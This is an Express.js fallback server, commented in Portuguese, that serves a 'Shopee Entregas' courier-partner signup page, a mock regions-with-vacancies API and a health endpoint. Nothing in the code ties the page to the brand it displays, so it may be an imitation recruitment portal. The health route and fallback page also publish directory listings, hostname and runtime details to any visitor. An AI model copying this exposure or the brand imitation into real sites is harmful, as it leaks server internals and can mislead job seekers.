/**
 * Servidor Express de fallback
 * 
 * Este servidor é uma implementação mínima em CommonJS
 * para garantir que a aplicação funcione mesmo em caso de
 * falha nas importações ES modules.
 */

const express = require('express');
const fs = require('fs');
const path = require('path');

// Configurar Express
const app = express();
const PORT = process.env.PORT || 5000;

// Usar JSON middleware
app.use(express.json());

console.log('🚀 Iniciando servidor Express de fallback...');
console.log(`📌 Diretório atual: ${process.cwd()}`);
console.log(`📌 Ambiente: ${process.env.NODE_ENV || 'não definido'}`);

// Verificar múltiplos locais para servir arquivos estáticos
const rootDir = process.cwd();
const publicDirs = [
  path.join(rootDir, 'public'),
  path.join(rootDir, 'dist', 'public'),
  path.join(rootDir, 'dist', 'client'),
  path.join(rootDir, 'dist'), // Adicionar dist/ diretamente
  path.join(rootDir, 'static')
];

// Configurar middleware de arquivos estáticos
let foundStaticDir = false;
for (const dir of publicDirs) {
  if (fs.existsSync(dir)) {
    console.log(`Servindo arquivos estáticos de: ${dir}`);
    app.use(express.static(dir));
    foundStaticDir = true;
    
    // Verificar se temos index.html
    const indexHtml = path.join(dir, 'index.html');
    if (fs.existsSync(indexHtml)) {
      console.log(`Usando index.html de: ${indexHtml}`);
    }
    
    // Verificar se temos uma pasta assets e listar seu conteúdo
    const assetsDir = path.join(dir, 'assets');
    if (fs.existsSync(assetsDir)) {
      console.log(`Pasta de assets encontrada em: ${assetsDir}`);
      try {
        const assetFiles = fs.readdirSync(assetsDir);
        console.log(`Assets disponíveis (${assetFiles.length}): ${assetFiles.slice(0, 5).join(', ')}${assetFiles.length > 5 ? '...' : ''}`);
      } catch (err) {
        console.error(`Erro ao listar assets: ${err.message}`);
      }
    }
  }
}

// Rota específica para servir arquivos de assets, buscando em todos os diretórios possíveis
app.get('/assets/*', (req, res, next) => {
  const assetPath = req.path.replace(/^\/assets\//, '');
  console.log(`Buscando asset: ${assetPath}`);
  
  // Verificar em todas as pastas de assets possíveis
  for (const dir of publicDirs) {
    const possibleAssetPaths = [
      path.join(dir, 'assets', assetPath),
      path.join(dir, assetPath)
    ];
    
    for (const assetFullPath of possibleAssetPaths) {
      if (fs.existsSync(assetFullPath)) {
        console.log(`Asset encontrado em: ${assetFullPath}`);
        return res.sendFile(assetFullPath);
      }
    }
  }
  
  // Se não encontrou em nenhum lugar, continuar para o próximo middleware
  next();
});

// Rota de diagnóstico
app.get('/api/health', (req, res) => {
  const staticDirs = publicDirs.map(dir => ({
    path: dir,
    exists: fs.existsSync(dir),
    files: fs.existsSync(dir) ? fs.readdirSync(dir).slice(0, 10) : []
  }));
  
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'not set',
    port: PORT,
    staticDirs
  });
});

// Rota básica para a API de regiões
app.get('/api/regions', (req, res) => {
  const regions = [
    { name: 'São Paulo', abbr: 'SP', vacancies: 26 },
    { name: 'Rio de Janeiro', abbr: 'RJ', vacancies: 18 },
    { name: 'Minas Gerais', abbr: 'MG', vacancies: 12 },
    { name: 'Bahia', abbr: 'BA', vacancies: 9 },
    { name: 'Paraná', abbr: 'PR', vacancies: 8 }
  ];
  
  res.json(regions);
});

// Rota fallback para SPA
app.get('*', (req, res) => {
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({ error: 'API endpoint não encontrado' });
  }
  
  // Tentar encontrar index.html em qualquer diretório
  for (const dir of publicDirs) {
    const indexPath = path.join(dir, 'index.html');
    if (fs.existsSync(indexPath)) {
      return res.sendFile(indexPath);
    }
  }
  
  // Informações de diagnóstico para exibir na página
  const diagnosticInfo = {
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'not set',
    nodeVersion: process.version,
    platform: process.platform,
    port: PORT,
    hostname: process.env.HOSTNAME || 'unknown',
    directories: publicDirs.map(dir => ({
      path: dir,
      exists: fs.existsSync(dir),
      files: fs.existsSync(dir) 
        ? fs.readdirSync(dir)
            .filter(file => !file.startsWith('.'))
            .slice(0, 5) 
        : []
    }))
  };
  
  // Resposta com página estática e informações de diagnóstico
  res.status(200).send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Shopee Entregas</title>
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
      <style>
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          margin: 0;
          padding: 0;
          background-color: #f5f5f5;
          color: #333;
        }
        header {
          background-color: #ee4d2d;
          color: white;
          padding: 1.5rem 1rem;
          text-align: center;
          box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        main {
          padding: 2rem;
          max-width: 1000px;
          margin: 0 auto;
        }
        .card {
          background-color: white;
          border-radius: 8px;
          padding: 1.5rem;
          box-shadow: 0 2px 8px rgba(0,0,0,0.05);
          margin-bottom: 1.5rem;
          border-left: 4px solid #ee4d2d;
        }
        .info-card {
          background-color: #e7f5ff;
          border-left-color: #4dabf7;
        }
        h1 { 
          margin-top: 0; 
          font-size: 2.2rem;
        }
        h2 { 
          color: #ee4d2d; 
          margin-top: 0;
          display: flex;
          align-items: center;
        }
        h2 i {
          margin-right: 0.8rem;
        }
        .benefits {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
          gap: 1rem;
        }
        .benefit-item {
          background-color: #fff9db;
          padding: 1rem;
          border-radius: 8px;
          text-align: center;
          box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        .benefit-item i {
          font-size: 2rem;
          color: #ee4d2d;
          margin-bottom: 0.5rem;
        }
        .cta-buttons {
          display: flex;
          gap: 1rem;
          margin-top: 1.5rem;
          flex-wrap: wrap;
        }
        .cta-button {
          display: inline-block;
          padding: 0.8rem 1.5rem;
          background-color: #ee4d2d;
          color: white;
          text-decoration: none;
          border-radius: 4px;
          font-weight: 500;
          transition: background-color 0.2s;
        }
        .cta-button:hover {
          background-color: #e53e2d;
        }
        .secondary-button {
          background-color: #f8f9fa;
          color: #495057;
          border: 1px solid #dee2e6;
        }
        .secondary-button:hover {
          background-color: #e9ecef;
        }
        
        .debug-section {
          margin-top: 3rem;
          padding-top: 1.5rem;
          border-top: 1px dashed #adb5bd;
        }
        .debug-section h3 {
          color: #495057;
        }
        .debug-info {
          font-family: monospace;
          background-color: #f8f9fa;
          padding: 1rem;
          border-radius: 4px;
          overflow: auto;
          max-height: 300px;
        }
        
        /* Responsividade */
        @media (max-width: 768px) {
          .benefits {
            grid-template-columns: 1fr 1fr;
          }
        }
        @media (max-width: 480px) {
          .benefits {
            grid-template-columns: 1fr;
          }
        }
      </style>
    </head>
    <body>
      <header>
        <h1>Shopee Entregas</h1>
        <p>Portal do Entregador Parceiro</p>
      </header>
      <main>
        <div class="card info-card">
          <h2><i class="fas fa-info-circle"></i> Servidor em Modo de Contingência</h2>
          <p>Este servidor está operando no modo de contingência para garantir disponibilidade. A versão completa do aplicativo será restaurada em breve.</p>
        </div>
        
        <div class="card">
          <h2><i class="fas fa-user"></i> Seja um entregador parceiro</h2>
          <p>Receba pedidos e entregue com independência e flexibilidade. Faça seu próprio horário e maximize seus ganhos através da nossa plataforma.</p>
          
          <div class="cta-buttons">
            <a href="/cadastro" class="cta-button">Cadastre-se agora</a>
            <a href="/entrega" class="cta-button secondary-button">Entrar na plataforma</a>
          </div>
        </div>
        
        <div class="card">
          <h2><i class="fas fa-gift"></i> Benefícios</h2>
          <div class="benefits">
            <div class="benefit-item">
              <i class="fas fa-clock"></i>
              <h3>Horário Flexível</h3>
              <p>Trabalhe quando quiser</p>
            </div>
            <div class="benefit-item">
              <i class="fas fa-money-bill-wave"></i>
              <h3>Ganhos Semanais</h3>
              <p>Receba toda semana</p>
            </div>
            <div class="benefit-item">
              <i class="fas fa-headset"></i>
              <h3>Suporte 24/7</h3>
              <p>Sempre à disposição</p>
            </div>
            <div class="benefit-item">
              <i class="fas fa-map-marked-alt"></i>
              <h3>Várias Regiões</h3>
              <p>Entregue onde preferir</p>
            </div>
          </div>
        </div>
        
        <div class="debug-section">
          <h3>Informações de Diagnóstico</h3>
          <div class="debug-info">
            <pre>${JSON.stringify(diagnosticInfo, null, 2)}</pre>
          </div>
        </div>
      </main>
      
      <script>
        // Verificar status da API
        fetch('/api/health')
          .then(response => response.json())
          .then(data => {
            console.log('API Health Check:', data);
            
            // Adicionar informações sobre a API ao diagnóstico
            const debugInfo = document.querySelector('.debug-info pre');
            if (debugInfo) {
              const currentInfo = JSON.parse(debugInfo.textContent);
              currentInfo.apiStatus = 'connected';
              currentInfo.apiHealth = data;
              debugInfo.textContent = JSON.stringify(currentInfo, null, 2);
            }
          })
          .catch(error => {
            console.error('API Health Check Error:', error);
            
            // Adicionar informações de erro ao diagnóstico
            const debugInfo = document.querySelector('.debug-info pre');
            if (debugInfo) {
              const currentInfo = JSON.parse(debugInfo.textContent);
              currentInfo.apiStatus = 'error';
              currentInfo.apiError = error.toString();
              debugInfo.textContent = JSON.stringify(currentInfo, null, 2);
            }
          });
      </script>
    </body>
    </html>
  `);
});

// Iniciar o servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Servidor Express de fallback rodando na porta ${PORT}`);
});